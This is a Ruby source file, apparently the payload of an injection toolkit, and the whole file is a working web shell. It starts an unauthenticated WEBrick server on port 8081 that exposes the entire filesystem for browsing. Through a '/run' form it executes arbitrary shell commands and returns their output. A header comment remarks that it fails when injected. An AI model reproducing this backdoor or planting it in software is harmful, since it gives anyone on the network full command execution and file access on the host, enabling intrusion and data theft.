# Uh yeah. So this doesn't work when injected.
#
# Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file or at http://github.org/redpig/patient0.


require 'webrick'
require 'timeout'
include WEBrick

s = HTTPServer.new(:Port => 8081, :DocumentRoot => "/", :Logger => Log.new(nil, BasicLog::WARN), :AccessLog => [])
s.mount("/fs", HTTPServlet::FileHandler, "/", :FancyIndexing => true)
class IndexServlet < HTTPServlet::AbstractServlet
  HOSTNAME = IO.popen("/bin/hostname", "r").read()
  PID = Process.pid
  def do_GET(req, res)
    res.body = String(<<-EOF).gsub(/\n/, '')
<html>
<head>
<title>rubella @ #{HOSTNAME} in pid: #{PID}</title>
</head>
<body>
Would you like to:<br/>
<ul>
<li><a href="/run">Run a command</a></li>
<li><a href="/fs">Browse the filesystem</a></li>
</ul>
</body>
</html>
    EOF
    res['Content-Type'] = "text/html"
  end
end
s.mount("/", IndexServlet)

class RunServlet < HTTPServlet::AbstractServlet
  def do_GET(req, res)
    unless req.query.has_key? 'cmdline'
      res.body = String(<<-EOF).gsub(/\n/, '')
<html>
<head>
<title>RUN!</title>
</head>
<body>
<form>
Command: <input type=string name=cmdline length=60 />
<input type=submit name=submit />
</form>
</body>
</html>
    EOF
    else
      result = ""
      begin
        timeout(10) {
          result = IO.popen(req.query['cmdline'], "r").read()
        }
      rescue => e
        result = 'timed out'
      end
      res.body = String(<<-EOF).gsub(/\n/, '')
<html>
<head>
<title>RUN!</title>
</head>
<body>
<form>
Command: <input type=string name=cmdline length=60 />
<input type=submit name=submit />
</form>
Result:<br/>
<pre>#{result.gsub(/</, '<').gsub(/\n/, '<br/>')}</pre>
</body>
</html>
    EOF
    end
    res['Content-Type'] = "text/html"
  end
end
s.mount("/run", RunServlet)
s.start
